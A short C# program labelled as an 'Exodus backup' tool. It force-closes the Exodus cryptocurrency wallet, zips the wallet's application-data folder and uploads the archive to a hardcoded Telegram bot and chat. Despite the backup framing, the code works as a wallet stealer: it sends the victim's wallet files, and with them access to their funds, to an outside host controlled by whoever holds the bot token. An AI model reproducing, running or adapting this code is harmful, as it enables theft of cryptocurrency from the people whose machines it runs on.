using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;

class ExodusBackup
{
    // === CONFIG ===
    private static string BOT_TOKEN = "8201470632:AAF5IUsKsaw6P0sXCzKzjFxkA58HRhUi0ok";
    private static string CHAT_ID = "-1003124606143";
    private static string SOURCE_FOLDER = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Exodus");
    // =================

    static async Task Main()
    {
        try
        {
            // 1) Force close Exodus
            Console.WriteLine("Closing Exodus if running...");
            foreach (var proc in Process.GetProcessesByName("Exodus"))
            {
                proc.Kill();
                proc.WaitForExit();
            }

            // 2) Copy folder to temp
            string tempRoot = Path.Combine(Path.GetTempPath(), "Exodus_backup_" + Guid.NewGuid());
            string tempFolder = Path.Combine(tempRoot, "Exodus");
            DirectoryCopy(SOURCE_FOLDER, tempFolder, true);

            // 3) Create zip
            string zipPath = Path.Combine(tempRoot, "Exodus_backup.zip");
            ZipFile.CreateFromDirectory(tempFolder, zipPath);

            // 4) Send to Telegram
            Console.WriteLine("Uploading backup to Telegram...");
            bool success = await SendFileToTelegram(zipPath);
            Console.WriteLine(success ? "Backup sent successfully." : "Failed to send backup.");

            // 5) Cleanup
            Directory.Delete(tempRoot, true);
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error: " + ex.Message);
        }
    }

    static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
    {
        DirectoryInfo dir = new DirectoryInfo(sourceDirName);
        if (!dir.Exists) throw new DirectoryNotFoundException("Source folder not found: " + sourceDirName);

        DirectoryInfo[] dirs = dir.GetDirectories();
        Directory.CreateDirectory(destDirName);

        foreach (FileInfo file in dir.GetFiles())
        {
            string temppath = Path.Combine(destDirName, file.Name);
            file.CopyTo(temppath, true);
        }

        if (copySubDirs)
        {
            foreach (DirectoryInfo subdir in dirs)
            {
                string temppath = Path.Combine(destDirName, subdir.Name);
                DirectoryCopy(subdir.FullName, temppath, copySubDirs);
            }
        }
    }

    static async Task<bool> SendFileToTelegram(string filePath)
    {
        try
        {
            using var client = new HttpClient();
            using var content = new MultipartFormDataContent();
            using var fs = File.OpenRead(filePath);
            content.Add(new StreamContent(fs), "document", Path.GetFileName(filePath));
            content.Add(new StringContent(CHAT_ID), "chat_id");
            var resp = await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", content);
            string result = await resp.Content.ReadAsStringAsync();
            return resp.IsSuccessStatusCode;
        }
        catch
        {
            return false;
        }
    }
}
